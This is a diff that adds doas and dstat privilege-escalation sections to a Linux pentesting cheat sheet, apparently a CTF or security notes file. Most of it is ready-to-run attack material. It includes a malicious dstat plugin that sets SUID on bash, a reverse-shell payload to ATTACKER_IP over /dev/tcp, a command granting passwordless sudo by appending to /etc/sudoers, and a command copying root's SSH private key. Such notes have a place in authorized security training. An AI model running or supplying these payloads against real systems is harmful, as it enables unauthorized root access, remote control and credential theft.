@@ -1072,6 +1072,100 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 
 * Run /tmp/rootbash with -p to gain a root shell `/tmp/rootbash -p`
 
+### doas Privilege Escalation
+
+`doas` is a BSD alternative to sudo. Check for SUID and config.
+
+**Detection:**
+
+```bash
+# Find doas binary
+find / -type f -name "doas" 2>/dev/null
+ls -la /usr/local/bin/doas
+
+# Find config
+find / -type f -name "doas*" 2>/dev/null
+cat /usr/local/etc/doas.conf
+```
+
+**Config format:**
+
+```
+permit nopass <user> as root cmd <command>
+```
+
+**Exploitation depends on allowed command - check GTFOBins.**
+
+### dstat Plugin Privilege Escalation
+
+If `doas` or `sudo` allows running `dstat`, exploit via custom plugin.
+
+**Detection:**
+
+```bash
+# Check doas config
+cat /usr/local/etc/doas.conf
+# permit nopass player as root cmd /usr/bin/dstat
+
+# Or sudo -l
+sudo -l
+# (root) NOPASSWD: /usr/bin/dstat
+```
+
+**Find plugin directories:**
+
+```bash
+find / -type d -name dstat 2>/dev/null
+# /usr/share/dstat
+# /usr/local/share/dstat
+```
+
+**Create malicious plugin:**
+
+```bash
+# Plugin must be named dstat_<name>.py
+vim /usr/local/share/dstat/dstat_exploit.py
+```
+
+```python
+import os
+os.system('chmod +s /usr/bin/bash')
+```
+
+**Execute:**
+
+```bash
+# List plugins to verify
+dstat --list
+# Should show "exploit" in /usr/local/share/dstat
+
+# Run with doas/sudo
+doas /usr/bin/dstat --exploit
+# or
+sudo /usr/bin/dstat --exploit
+
+# Get root shell
+bash -p
+```
+
+**Alternative plugin payloads:**
+
+```python
+# Reverse shell
+import os
+os.system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
+
+# Add user to sudoers
+import os
+os.system('echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
+
+# Copy root's SSH key
+import os
+os.system('cp /root/.ssh/id_rsa /tmp/rootkey && chmod 644 /tmp/rootkey')
+```
+
+**Reference:** https://gtfobins.github.io/gtfobins/dstat/
+
 ### Docker Linux Local PE
 
 ```
